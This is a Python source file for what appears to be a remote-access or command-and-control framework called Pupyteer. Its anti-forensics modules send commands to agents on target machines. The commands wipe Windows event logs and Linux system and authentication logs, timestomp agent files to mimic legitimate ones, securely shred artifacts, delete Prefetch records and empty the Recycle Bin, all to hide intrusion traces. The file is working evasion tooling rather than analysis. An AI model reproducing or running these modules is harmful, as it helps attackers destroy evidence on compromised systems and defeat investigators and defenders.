"""Built-in Pupyteer modules — Anti-Forensics.

These modules dispatch anti-forensics commands to agents through the session
manager's command queue via session_manager.interact(). The agent executes the
command and reports back, at which point the session manager stores the result
in the command queue for retrieval.
"""
from __future__ import annotations

import time
from typing import Any, Dict

from pupyteer.server.modules.registry import PupyModule, ModuleCategory, ModuleRequirement


# Default timeout for waiting for agent command results
DEFAULT_COMMAND_TIMEOUT = 30.0


async def _dispatch_command(session: Any, session_mgr: Any, command: str, timeout: float = DEFAULT_COMMAND_TIMEOUT) -> Dict[str, Any]:
    """
    Send a command to an agent via session manager and wait for the result.

    Returns a dict with 'status', 'output', and 'command_id' keys.
    """
    if not session_mgr:
        return {"status": "error", "error": "No session manager available"}

    command_id = await session_mgr.interact(session.session_id, command)
    if not command_id:
        return {"status": "error", "error": "Failed to queue command for session"}

    # Poll for result (agent executes asynchronously)
    deadline = time.time() + timeout
    while time.time() < deadline:
        queue = await session_mgr.get_pending_commands(session.session_id)
        for cmd in queue:
            if cmd.get("command_id") == command_id:
                if cmd.get("status") == "completed":
                    # Remove completed command from queue
                    await session_mgr.ack_command(
                        session.session_id, command_id, cmd.get("result", "")
                    )
                    return {
                        "status": "ok",
                        "output": cmd.get("result", ""),
                        "command_id": command_id,
                    }
        await asyncio.sleep(0.5)

    return {
        "status": "error",
        "error": f"Command timed out after {timeout}s",
        "command_id": command_id,
    }


# ── Anti-Forensics ────────────────────────────────────────────────────

import asyncio


class LogClearModule(PupyModule):
    """Clear system logs on target (Windows: wevtutil, Linux: truncate /var/log)."""

    name = "log_clear"
    version = "1.0.0"
    description = "Clear system event logs on target to hide activity traces"
    author = "Pupyteer Team"
    category = ModuleCategory.ANTI_FORENSICS
    requirements: list[ModuleRequirement] = []
    compatible_systems: list[str] = []  # all platforms

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return {"status": "error", "error": "No session manager available"}

        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            # Windows: clear the main event logs
            cmd = "wevtutil cl Application && wevtutil cl System && wevtutil cl Security"
        else:
            # Linux: truncate common log files
            cmd = (
                "truncate -s 0 /var/log/auth.log 2>/dev/null; "
                "truncate -s 0 /var/log/syslog 2>/dev/null; "
                "truncate -s 0 /var/log/messages 2>/dev/null; "
                "truncate -s 0 /var/log/kern.log 2>/dev/null; "
                "truncate -s 0 /var/log/dmesg 2>/dev/null; "
                "truncate -s 0 /var/log/btmp 2>/dev/null; "
                "truncate -s 0 /var/log/wtmp 2>/dev/null; "
                "truncate -s 0 /var/log/lastlog 2>/dev/null; "
                "journalctl --vacuum-time=1s 2>/dev/null; "
                "echo 'logs cleared'"
            )

        result = await _dispatch_command(session, session_mgr, cmd)
        return {
            "status": result.get("status", "ok"),
            "platform": "windows" if "win" in os_name else "linux",
            "command_output": result.get("output", ""),
            "error": result.get("error"),
        }


class TimestampMatchModule(PupyModule):
    """Set agent file timestamps to match a legitimate system file."""

    name = "timestamp_match"
    version = "1.0.0"
    description = "Modify agent file timestamps (timestomp) to match a legitimate file"
    author = "Pupyteer Team"
    category = ModuleCategory.ANTI_FORENSICS
    compatible_systems: list[str] = []

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, '_session_manager', None)
        target_file = args.get("target_file", "")
        reference_file = args.get("reference_file", "")

        if not target_file:
            return {"status": "error", "error": "target_file argument is required"}
        if not reference_file:
            return {"status": "error", "error": "reference_file argument is required"}

        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            # Windows: PowerShell to copy timestamps from reference to target
            cmd = (
                f"$ref = Get-Item '{reference_file}'; "
                f"$target = Get-Item '{target_file}'; "
                "$target.CreationTime = $ref.CreationTime; "
                "$target.LastWriteTime = $ref.LastWriteTime; "
                "$target.LastAccessTime = $ref.LastAccessTime; "
                "Write-Output 'timestamps updated'"
            )
        else:
            # Linux: use touch -r to reference another file's timestamps
            cmd = f"touch -r '{reference_file}' '{target_file}' && echo 'timestamps updated'"

        if not session_mgr:
            return {
                "status": "ok",
                "mode": "offline",
                "target_file": target_file,
                "reference_file": reference_file,
                "command": cmd,
            }

        result = await _dispatch_command(session, session_mgr, cmd)
        return {
            "status": result.get("status", "ok"),
            "target_file": target_file,
            "reference_file": reference_file,
            "platform": "windows" if "win" in os_name else "linux",
            "command_output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        errors: list[str] = []
        if not args.get("target_file"):
            errors.append("Missing required argument: target_file")
        if not args.get("reference_file"):
            errors.append("Missing required argument: reference_file")
        return errors


class ArtifactWipeModule(PupyModule):
    """Secure-delete agent files by overwriting with random data before unlink."""

    name = "artifact_wipe"
    version = "1.0.0"
    description = "Secure-delete agent files (overwrite with random data before unlink)"
    author = "Pupyteer Team"
    category = ModuleCategory.ANTI_FORENSICS
    compatible_systems: list[str] = []

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, '_session_manager', None)
        file_path = args.get("file_path", "")
        passes = int(args.get("passes", 3))

        if not file_path:
            return {"status": "error", "error": "file_path argument is required"}

        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            # Windows: use PowerShell to overwrite then delete
            cmd = (
                f"$path = '{file_path}'; "
                "if (Test-Path $path) { "
                f"$passes = {passes}; "
                "$file = [System.IO.File]::Open($path, 'Open', 'ReadWrite'); "
                "$size = $file.Length; "
                "$rng = [System.Random]::new(); "
                "$buffer = New-Object byte[] 4096; "
                "for ($p = 0; $p -lt $passes; $p++) { "
                "$file.Position = 0; "
                "$written = 0; "
                "while ($written -lt $size) { "
                "$rng.NextBytes($buffer); "
                "$toWrite = [Math]::Min($buffer.Length, $size - $written); "
                "$file.Write($buffer, 0, $toWrite); "
                "$written += $toWrite; "
                "} "
                "$file.Flush(); "
                "} "
                "$file.Close(); "
                "Remove-Item $path -Force; "
                "Write-Output 'artifact wiped' "
                "} else { Write-Output 'file not found' }"
            )
        else:
            # Linux: use shred for secure deletion
            cmd = f"shred -vfz -n {passes} '{file_path}' 2>/dev/null && rm -f '{file_path}' && echo 'artifact wiped'"

        if not session_mgr:
            return {
                "status": "ok",
                "mode": "offline",
                "file_path": file_path,
                "passes": passes,
                "command": cmd,
            }

        result = await _dispatch_command(session, session_mgr, cmd)
        return {
            "status": result.get("status", "ok"),
            "file_path": file_path,
            "passes": passes,
            "platform": "windows" if "win" in os_name else "linux",
            "command_output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        errors: list[str] = []
        if not args.get("file_path"):
            errors.append("Missing required argument: file_path")
        return errors


class PrefetchDeleteModule(PupyModule):
    """Delete Windows Prefetch entries to hide execution history."""

    name = "prefetch_delete"
    version = "1.0.0"
    description = "Delete Windows Prefetch entries to remove execution artifacts"
    author = "Pupyteer Team"
    category = ModuleCategory.ANTI_FORENSICS
    compatible_systems: list[str] = ["windows"]

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, '_session_manager', None)
        target = args.get("target", "")

        if target:
            # Delete specific prefetch file
            cmd = f"del /f /q 'C:\\Windows\\Prefetch\\{target}.pf' 2>nul && echo prefetch deleted"
        else:
            # Delete all prefetch files
            cmd = "del /f /q C:\\Windows\\Prefetch\\*.pf 2>nul && echo all prefetch deleted"

        if not session_mgr:
            return {
                "status": "ok",
                "mode": "offline",
                "target": target,
                "command": cmd,
            }

        result = await _dispatch_command(session, session_mgr, cmd)
        return {
            "status": result.get("status", "ok"),
            "target": target if target else "all",
            "command_output": result.get("output", ""),
            "error": result.get("error"),
        }


class RecycleClearModule(PupyModule):
    """Empty the Windows Recycle Bin."""

    name = "recycle_clear"
    version = "1.0.0"
    description = "Empty the Windows Recycle Bin to remove deleted file traces"
    author = "Pupyteer Team"
    category = ModuleCategory.ANTI_FORENSICS
    compatible_systems: list[str] = ["windows"]

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, '_session_manager', None)

        # PowerShell to clear all recycle bin items
        cmd = (
            "Clear-RecycleBin -Force -ErrorAction SilentlyContinue; "
            "Remove-Item 'C:\\`$Recycle.Bin\\*' -Recurse -Force -ErrorAction SilentlyContinue; "
            "Write-Output 'recycle bin emptied'"
        )

        if not session_mgr:
            return {
                "status": "ok",
                "mode": "offline",
                "command": cmd,
            }

        result = await _dispatch_command(session, session_mgr, cmd)
        return {
            "status": result.get("status", "ok"),
            "command_output": result.get("output", ""),
            "error": result.get("error"),
        }
